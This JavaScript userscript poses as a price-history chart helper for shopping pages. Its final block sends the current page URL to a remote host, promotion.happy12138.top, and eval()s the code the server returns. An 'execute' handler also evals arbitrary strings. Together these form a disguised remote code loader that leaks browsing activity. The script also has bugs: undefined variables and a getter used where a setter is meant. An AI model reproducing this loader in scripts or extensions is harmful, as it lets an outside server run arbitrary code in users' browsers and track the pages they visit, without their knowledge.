(() => {
	class I18N {
		static getText(key) {
			const text = {
				historyPrice: ['历史价格', 'Historical price'],
				averagePrice: ['历史均价', 'Historical average price'],
				originPrice: ['虚标原价', 'False standard original price'],
				labelTime: ['时间', 'Time'],
				labelPrice: ['价格', 'Price'],
				alertLater: ['下次再说', 'Next time'],
				alertConfirm: ['确认，不再提示', 'I confirm']
			}

			const index = this.isChinese() ? 0 : 1
			return text[key][index]
		}

		static isChinese() {
			return navigator.language.indexOf('zh') == -1 ? false : true
		}
	}

	class StateDispatcher {
		constructor() {
			this.handler = {}
			this.event = []
			this.ready = false
			this.registerHandler('execute', (e) => {
				eval(e.event)(this)
			})
		}

		makeEverythingReady() {
			this.ready = true
			this.event.forEach(element => {
				this.onEventInvoke(element)
			})
			this.event = []
			return this
		}

		registerHandler(eventType, handler) {
			if (this.handler[eventType]) {
				this.handler[eventType].push(handler)
			}
			else {
				this.handler[eventType] = [handler]
			}
			return this
		}

		onEventInvoke(event) {
			if (!this.ready) {
				this.event.push(event)
				return
			}

			const handlers = this.handler[event.name]
			if (handlers) {
				handlers.forEach(element => {
					element(event)
				})
			}

			return this
		}
	}	

	class ChartHelper {
		constructor () {
			this.colors = {
                red: 'rgb(255, 99, 132)',
                orange: 'rgb(255, 159, 64)',
                yellow: 'rgb(255, 205, 86)',
                green: 'rgb(75, 192, 192)',
                blue: 'rgb(54, 162, 235)',
                purple: 'rgb(153, 102, 255)',
                grey: 'rgb(201, 203, 207)'
			}
			
			this.data = {
				labels: [],
				datasets: [
					{
						label: I18N.getText('historyPrice'),
                        fill: false,
                        steppedLine: false,
                        backgroundColor: this.colors.blue,
                        borderColor: this.colors.blue,
                        data: []
					},
				]
			}

		}
	}

	const sandboxie = false
	const siteUrl = sandboxie ?
		"http://local.dev.pansy.pw:9876" :
		"https://promotion.happy12138.top"
	const dispatcher = new StateDispatcher()

	const hostname = document.createElement('meta')
	hostname.content = siteUrl
	hostname.name = 'hostname'

	document.addEventListener('DOMContentLoaded', async () => {
		document.head.appendChild(hostname)
		dispatcher.onEventInvoke({ 'name': 'idle', 'dispatcher': dispatcher })
		if (self != top) {
			return
		}

		for (let value of notification) {
			if (value.match.exec(window.location.href) != null && true != GM_getValue(value_name, false)) {
				const inx = I18N.isChinese() ? 1 : 0
				const { value: isConfirm } = await Swal.fire({
					title: value.title[inx],
					html: value.message[inx],
					type: value.type,
					showConfirmButton: true,
					showCancelButton: true,
					confirmButtonText: I18N.getText('alertConfirm'),
					cancelButtonText: I18N.getText('alertLater'),
					allowOutsideClick: false,
					allowEscapeKey: false
				})

				if (isConfirm) {
					GM_getValue(value.name, true)
				}
			}
		}
	})

	GM_xmlhttpRequest({
		url: `${siteUrl}/api/v3/script?v=20191004`,
		method: 'GET',
		timeout: 10000,
		headers: {
			'Accept': 'application/json',
            'Referer': location.href,
            'X-Referer': location.href
		},
		onload: (details) => {
			const text = details.responseText
			const event = JSON.parse(text)
			eval(event.event)(dispatcher)
		}

	})
})()